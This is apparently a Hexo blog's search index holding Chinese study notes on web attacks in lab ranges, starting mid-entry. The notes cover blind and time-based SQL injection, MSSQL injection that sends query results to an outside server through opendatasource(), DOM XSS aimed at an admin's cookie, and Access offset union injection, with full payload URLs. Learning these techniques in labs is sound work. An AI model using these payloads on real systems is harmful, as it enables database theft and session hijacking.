class="line">and（ascii(substr((select zKzQ from zkaq limit 4,1),1,1)))=122--+</span><br></pre></td></tr></table></figure></p><p>具体就是一位一位的猜……其实这样挺麻烦的，可以通过sqlmap进行注入。</p><h3 id="时间盲注"><a href="#时间盲注" class="headerlink" title="时间盲注"></a>时间盲注</h3><p>主要通过sleep函数进行注入：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=1&apos;and if(ascii(substr(databse(),1,1))=115,sleep(5),1)#</span><br></pre></td></tr></table></figure><p>通过if判断执行sql语句，如果条件为真就执行sleep 停5秒再返回，如果为假就执行1即立即返回页面</p>]]></content>
      
      
      <categories>
          
          <category> 笔记 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>mssql反弹注入</title>
      <link href="/2019/12/07/mssql%E5%8F%8D%E5%BC%B9%E6%B3%A8%E5%85%A5/"/>
      <url>/2019/12/07/mssql%E5%8F%8D%E5%BC%B9%E6%B3%A8%E5%85%A5/</url>
      
        <content type="html"><![CDATA[<p>我们通过’去检测，发现出现了报错，显示<strong>odbc exec()</strong>in C:\Users\Administrator\Desktop\phpstudy\WWW\MSSQL\index.php on line 13,说明用的是mssql数据库；</p><p><img src="http://m.qpic.cn/psb?/V10ZDHQP0EtwOl/L5ya2V*ygEG.5muAFL5ET6AxyulNaRiLwpRO1EFtodA!/b/dLgAAAAAAAAA&amp;bo=QQSjAAAAAAADB8Q!&amp;rf=viewer_4" alt></p><p>我们通过测试去尝试注入，发现都很难以进行注入，又是mssql数据，那我们可以尝试通过反弹注入；</p><h2 id="反弹注入介绍："><a href="#反弹注入介绍：" class="headerlink" title="反弹注入介绍："></a>反弹注入介绍：</h2><p>反弹注入就是利用<strong>SQL SERVER的opendatasource() 函数</strong>，来将当前数据库查询结果发送到另一个外网服务器的SQL SERVER数据库中，然后我们在通过外网服务器的（自己搭建）数据库去查看我们查询的结果</p><h2 id="注入步骤："><a href="#注入步骤：" class="headerlink" title="注入步骤："></a>注入步骤：</h2><ul><li>首先我们要在接收查询结果的服务器上，去搭建好SQL SERVER数据库的环境，然后建立一个具有管理权限的数据库账户</li></ul><p>（在这里我们可以通过<a href="http://www.webweb.com/" target="_blank" rel="noopener">香港云</a>去创建一个临时数据库并在里面创建一个数据库）</p><p>（注意：要记住创建数据库地址，数据库名，用户名，登录密码，在后面我们要通过他们来传送自己查询的数据到服务器的数据库上）</p><ul><li><strong>在DB_14A8E33_4veqjdc8建立t1表；</strong><br> <img src="http://m.qpic.cn/psb?/V10ZDHQP0EtwOl/YXHhYQhTY3Zh2Xx3KguZ4REiacY0bIEba3L00BE0tso!/b/dDQBAAAAAAAA&amp;bo=EwXNAQAAAAADF.g!&amp;rf=viewer_4" alt></li><li>然后我们通过访问带有opendatasource() 函数的插入语句将查询语句的结果发送到另一个数据库服务器中:</li></ul><p>在这，mssql的名称为sqloledb；再通过连接地址、端口、用户名、密码、数据库名：server=连接地址，端口，uid=用户名，pwd=密；database=数据库名称。连接上服务器后选定数据表DB_14A8E33_4veqjdc8.dbo.t1把后面语句查询结果插入到表中。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://120.203.13.75:8150/MSSQL/?id=2&apos;; insert into opendatasource(&apos;sqloledb&apos;,&apos;server=SQL5006.webweb.com,1433;uid=DB_14A8E33_4veqjdc8_admin;pwd=123456789;database=DB_14A8E33_4veqjdc8&apos;).DB_14A8E33_4veqjdc8.dbo.t1 select * from admin --</span><br></pre></td></tr></table></figure><p>这里是通过；结束，在起一行sql语句，这里可以是说使用了堆叠注入；<br>反弹注入用一句话总结：就是让我们目标的数据库去查询那张表，然后将sql语句查询内容插入到公网的一台服务器的数据库中去。</p><p><img src="http://m.qpic.cn/psb?/V10ZDHQP0EtwOl/As84F9cHvY.Jrw7e8F5V0q8IfyQrL0Ko7jL2t4Qn4E0!/b/dL4AAAAAAAAA&amp;bo=fQfHAAAAAAADB58!&amp;rf=viewer_4" alt></p><p>发现显示正常，那么可能就是发送到服务器的数据库成功了，语句成功执行</p><ul><li>然后我们去通过访问服务器上的数据库DB_14A8E33_4veqjdc8的t1表，获取到了我们想要查询的数据：</li></ul><p><img src="http://m.qpic.cn/psb?/V10ZDHQP0EtwOl/5iF49ap5Ts4aLiPrYXtsQiYKmUokAEMUQJazAnH7H44!/b/dL4AAAAAAAAA&amp;bo=cgZWAAAAAAADFxA!&amp;rf=viewer_4" alt></p>]]></content>
      
      
      <categories>
          
          <category> 笔记 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>Hello World</title>
      <link href="/2019/12/07/hello-world/"/>
      <url>/2019/12/07/hello-world/</url>
      
        <content type="html"><![CDATA[<p>Welcome to <a href="https://hexo.io/" target="_blank" rel="noopener">Hexo</a>! This is your very first post. Check <a href="https://hexo.io/docs/" target="_blank" rel="noopener">documentation</a> for more info. If you get any problems when using Hexo, you can find the answer in <a href="https://hexo.io/docs/troubleshooting.html" target="_blank" rel="noopener">troubleshooting</a> or you can ask me on <a href="https://github.com/hexojs/hexo/issues" target="_blank" rel="noopener">GitHub</a>.</p><h2 id="Quick-Start"><a href="#Quick-Start" class="headerlink" title="Quick Start"></a>Quick Start</h2><h3 id="Create-a-new-post"><a href="#Create-a-new-post" class="headerlink" title="Create a new post"></a>Create a new post</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo new <span class="string">"My New Post"</span></span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/writing.html" target="_blank" rel="noopener">Writing</a></p><h3 id="Run-server"><a href="#Run-server" class="headerlink" title="Run server"></a>Run server</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo server</span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/server.html" target="_blank" rel="noopener">Server</a></p><h3 id="Generate-static-files"><a href="#Generate-static-files" class="headerlink" title="Generate static files"></a>Generate static files</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo generate</span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/generating.html" target="_blank" rel="noopener">Generating</a></p><h3 id="Deploy-to-remote-sites"><a href="#Deploy-to-remote-sites" class="headerlink" title="Deploy to remote sites"></a>Deploy to remote sites</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo deploy</span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/deployment.html" target="_blank" rel="noopener">Deployment</a></p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>dosXSS</title>
      <link href="/2019/12/07/domxss/"/>
      <url>/2019/12/07/domxss/</url>
      
        <content type="html"><![CDATA[<p>进入靶场一看，我们先使用最经典的弹窗语句去测试：发现页面上无弹窗，我们发现了一个奇怪的地方</p><p><img src="http://m.qpic.cn/psb?/V10ZDHQP0EtwOl/YRHxe6f8yYglIbLiTVCPBDVNd2zBNKspS.YO3oO3uVM!/b/dDQBAAAAAAAA&amp;bo=wwaJAwAAAAADB20!&amp;rf=viewer_4" alt></p><p>我们通过查看代码发现语句变成这样了</p><p><img src="http://m.qpic.cn/psb?/V10ZDHQP0EtwOl/Em9retJmjwJZ90Ast9xNFM5nxtQ9chksuXjpJKSKsL4!/b/dMEAAAAAAAAA&amp;bo=PgKtAAAAAAADF6M!&amp;rf=viewer_4" alt></p><p>我们尝试着闭合语句试试，竟然出现弹框</p><p><img src="http://m.qpic.cn/psb?/V10ZDHQP0EtwOl/n9truDqd*7gTaa*V1aN0SUsbUPOjHBbpStMHfr9zjPI!/b/dL8AAAAAAAAA&amp;bo=RAU7AgAAAAADF0o!&amp;rf=viewer_4" alt></p><p>通过发生事件也出现了弹框</p><p><img src="http://m.qpic.cn/psb?/V10ZDHQP0EtwOl/BcJ437.MUOuKvqZ1AifD455v6KT4wfcIC8wVcnVcARE!/b/dL8AAAAAAAAA&amp;bo=mgVZAwAAAAADF*c!&amp;rf=viewer_4" alt></p><p>我们试着在下面的聊天框也测试测试，凡是看见有框就插。。</p><p><img src="http://m.qpic.cn/psb?/V10ZDHQP0EtwOl/xfbHa701ePPTCRPq9C6PIC61AXFoGe.fq.Hri2ovwGo!/b/dDQBAAAAAAAA&amp;bo=iAVgAwAAAAADF9w!&amp;rf=viewer_4" alt></p><p>发现也弹窗了，以上这些都属于反射型XSS；<br>我们在靶场提示中知道了管理员会去访问dom.php页面，并且将源码透露给我们看了</p><p><img src="http://m.qpic.cn/psb?/V10ZDHQP0EtwOl/Gr1bzDuvtcou7WGDWdD4uGlAftdW66fORIKrFwhQDJc!/b/dFIBAAAAAAAA&amp;bo=IgRUAgAAAAADF0I!&amp;rf=viewer_4" alt></p><p>我们通过粗略的看了下代码，发现他通过get方式接受url的值，并进行解码，如果url的值与正则匹配的话，就传入参数进行过滤并将其插入到iframe内联框中，并将其添加到log.html后面</p><p><img src="http://m.qpic.cn/psb?/V10ZDHQP0EtwOl/WDJLFWUthFop*NhuYXkMMSTK5rGAbaT.oeSn3hiY1yQ!/b/dDQBAAAAAAAA&amp;bo=3QaEAwAAAAADF24!&amp;rf=viewer_4" alt></p><p>那我们知道了，所写的代码最终会传到log.html上去，而管理员也会定期查看，那我们能不能通过构造代码去传入到log.html。并获取管理员cookie。<br>那我们试着访问dom.php,我们发现里面什么都没有，</p><p><img src="http://m.qpic.cn/psb?/V10ZDHQP0EtwOl/N7D3*PMyd2ZMwYEMPmitnJrcLadAgf.mXC.pA8Ibn1Y!/b/dL4AAAAAAAAA&amp;bo=EAcbAwAAAAADFz0!&amp;rf=viewer_4" alt></p><p>如果我们把在聊天室插到的url上的xss拿过来试试能不能再这执行成功</p><p><img src="http://m.qpic.cn/psb?/V10ZDHQP0EtwOl/AwHAQYSnD3zaeAOi0PuxXfVhRzpqON7buau7Tw2Xl8Y!/b/dDEBAAAAAAAA&amp;bo=HQaHAAAAAAADF64!&amp;rf=viewer_4" alt></p><p>我们试着登录log.html，发现竟然弹窗了!</p><p><img src="http://m.qpic.cn/psb?/V10ZDHQP0EtwOl/8XtZjgHLYxPkMOvmH3WScSxW9PboAof3wNvmOy.3ddU!/b/dMAAAAAAAAAA&amp;bo=7QTMAQAAAAADFxY!&amp;rf=viewer_4" alt></p><p>那我们就可以开始通过xss平台上的payload去获取管理员的cookie了。</p>]]></content>
      
      
      <categories>
          
          <category> 笔记 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>access数据库之偏移注入</title>
      <link href="/2019/12/07/access/"/>
      <url>/2019/12/07/access/</url>
      
        <content type="html"><![CDATA[<h2 id="偏移注入介绍"><a href="#偏移注入介绍" class="headerlink" title="偏移注入介绍"></a>偏移注入介绍</h2><p>偏移注入是指我们在知道表，但查询不出来字段的情况，如系统自带的数据库权限不够而无法通过联合查询访问到系统自带库来爆出字段，而因为字段过长，sqlmap也难以爆出；或者是数据库是access数据库，默认没有系统库；而当遇到类似这种情况的时候，我们就可以尝试通过偏移注入来查询表里的数据；</p><h2 id><a href="#" class="headerlink" title="*"></a>*</h2><p><em>是通配符的意思，我们可以通过</em>来表示sql语句中已知表中的所有字段，在下面我们可以通过admin.*来表示admin表的所有字段。</p><h2 id="偏移注入流程"><a href="#偏移注入流程" class="headerlink" title="偏移注入流程"></a>偏移注入流程</h2><ol><li>判断注入点</li><li>order by 判断字段数</li><li>知道表名</li><li>联合查询</li><li>获取表中列数(知道存在几个字段以及输出点在哪)</li><li>开始偏移注入</li></ol><h2 id="具体做法讲解"><a href="#具体做法讲解" class="headerlink" title="具体做法讲解"></a>具体做法讲解</h2><p>如果我们已经知道的是admin这张表；<br>我们可以通过</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select exists(selct * from admin);</span><br></pre></td></tr></table></figure><p>来猜测是否有admin表，如果说存在的话页面就会显示正常。</p><p>exists函数的用法：EXISTS用于检查子查询是否至少会返回一行数据，该子查询实际上并不返回任何数据，而是返回值True或False</p><p>这里我们需要注意的是，access数据库联合查询后面是必须from一个表名，如果不知道表名，就直接用admin表，access数据库基本上有这个表。</p><ul><li><strong>判断字段数：</strong></li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1/new.php?id=1 order by 27  //错误显示</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1/new.php?id=1 order by 26 //正常显示</span><br></pre></td></tr></table></figure><p>说明字段为26个字段</p><ul><li><strong>联合查询爆出显示位</strong>:</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1/new.php?id=-1 union select 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26 from admin</span><br></pre></td></tr></table></figure><p>发现显示位是2，5，7；</p><ul><li><strong>开始偏移进行注入</strong></li></ul><p>在这里我们通过admin.*来表示admin表下的所有字段；</p><ul><li>admin表下所存在字段数：</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1/new.php?id=-1 union select 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,admin.* from admin</span><br></pre></td></tr></table></figure><p> 显示错误，说明admin表下字段不止一个，继续测试：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1/new.php?id=-1 union select 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,admin.* from admin</span><br></pre></td></tr></table></figure><p>正常回显，说明admin下字段有8个;</p><ul><li>我们在通过偏移进行爆出字段内容：</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1/new.php?id=-1 union select 1,2,3,4,5,6,admin.*,15,16,17,18,19,20,21,22,23,24,25,26 from admin</span><br></pre></td></tr></table></figure><p>通过偏移到显示位，查看字段内容，如想继续看其他字段可继续偏移；</p><p>（这里记录的一切只代表我学习的笔记,不一定全部正确，如果有错误之处还望指正！）</p>]]></content>
      
      
      <categories>
          
          <category> 笔记 </category>
          
      </categories>
      
      
    </entry>
    
    
  
  
</search>
